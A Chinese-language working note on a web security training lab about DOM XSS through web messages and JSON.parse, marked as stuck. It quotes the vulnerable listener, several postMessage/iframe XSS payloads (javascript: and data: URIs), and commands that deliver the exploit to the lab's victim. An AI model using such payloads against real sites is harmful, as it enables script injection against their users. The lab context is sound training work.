---
title: "lab-dom-xss-using-web-messages-and-json-parse"
links:
  - target: dom-xss-family
    relation: evidences
---

# lab-dom-xss-using-web-messages-and-json-parse

> evidences: [[dom-xss-family]]

- 题面:DOM XSS using web messages and JSON.parse(/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
- 实例:https://0aeb004d03dfa22980f0e95f00580012.web-security-academy.net
- 利用服务器:https://exploit-0a3e00380368a28980a1e85101960005.exploit-server.net
- slug(真):即请求 slug(lab_id 912C5F0D…)
- 判定目标:web message 经 JSON.parse 触发 sink 执行 `print()`;状态:**stuck**

## 已确认

1. 首页内联监听:
   ```js
   window.addEventListener('message', function(e){
     var iframe=document.createElement('iframe'), ACMEplayer={element:iframe}, d;
     document.body.appendChild(iframe);
     try { d = JSON.parse(e.data); } catch(e){ return; }
     switch(d.type){
       case "page-load": ACMEplayer.element.scrollIntoView(); break;
       case "load-channel": ACMEplayer.element.src = d.url; break;      // ← 唯一可执行面
       case "player-height-changed": ACMEplayer.element.style.width=d.width+"px"; ...; break;
     }
   }, false);
   ```
2. 唯一运行时 sink 是 `load-channel` → 给一个新 iframe 赋 `src`;投递
   `<iframe src="<LAB>/" onload="this.contentWindow.postMessage('{"type":"load-channel","url":"javascript:print()"}','*')"></iframe>`。
3. **可达性(新实例 0a57001003ec85e2802c03b300ee008e)**:首页**无 CSP**(只有 connection/content-type);直接在 lab 页发 `window.postMessage('{"type":"load-channel","url":"javascript:document.title=\'ZQPWN\'"}','*')` 后,`document.querySelectorAll('iframe')` 出现 `src="javascript:document.title='ZQPWN'"` ⇒ **listener/JSON.parse/sink 全线可达**。
4. **iframe `javascript:` 导航的执行性:两组观测的观测点不同** ——①`f.src="javascript:parent.document.title='RANJS2'"` 后**顶层** `document.title` 变为 `RANJS2`(脚本确实跑了);②上面 sink 赋值的那个 iframe,其 `contentDocument.title` 仍为空(在该点看不出执行)。⇒ 判读要看**父页可观察副作用**(`parent.document.title`),不要只看 iframe 自身 document。

## 未决面 / 卡点

- 交付 4 个变体均不 flip(受害者在每次交付都 `GET /exploit/`):`javascript:print()`、`data:text/html,<script>print()</script>`、`javascript:top.print()`(交付时 top 是跨源 exploit 页,应被拦)、`javascript:parent.print()`。
- 卡点收窄为「找到一种在 **fresh about:blank iframe 的 `src`** 上仍会被执行的载荷」
  (sink 只接 `src` 属性;备选:同源 URL + 反射点、`srcdoc` 效果)。
- 下一步:本机端到端跑交付链——`browser_suite` 打开 exploit 页、`eval` 查 lab 侧 iframe 的 `src` 与**父页**可观察副作用,
  区分“postMessage 未达”与“`javascript:` iframe 导航被当前 Chrome 拒”;再用官方 Collaborator/真 Chrome 复核 `print()` 判读语义。

## 复现命令

```
lab_launch launch 912C5F0D3D0D2905771DA05AD007FD099D6FCD364CF93D4A3B855D2D64BDCAAC --widget-source /web-security/dom-based/controlling-the-web-message-source --jar /tmp/b16-jar5.json
# 本地核测(执行性): browse goto <LAB>/ ; browse eval "(function(){var f=document.createElement('iframe');document.body.appendChild(f);f.src=\"javascript:parent.document.title='X'\"})()" ; browse eval document.title
lab_http post "https://<exploit>/" --jar /tmp/b16-jar5.json --follow --form urlIsHttps=on --form responseFile=/exploit \
  --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' \
  --form 'responseBody=<iframe src="https://<inst>/" onload="this.contentWindow.postMessage(&#39;{\&quot;type\&quot;:\&quot;load-channel\&quot;,\&quot;url\&quot;:\&quot;javascript:print()\&quot;}&#39;,&#39;*&#39;)"></iframe>' --form formAction=DELIVER_TO_VICTIM
solved_check "<inst>/" --jar /tmp/b16-jar5.json
```
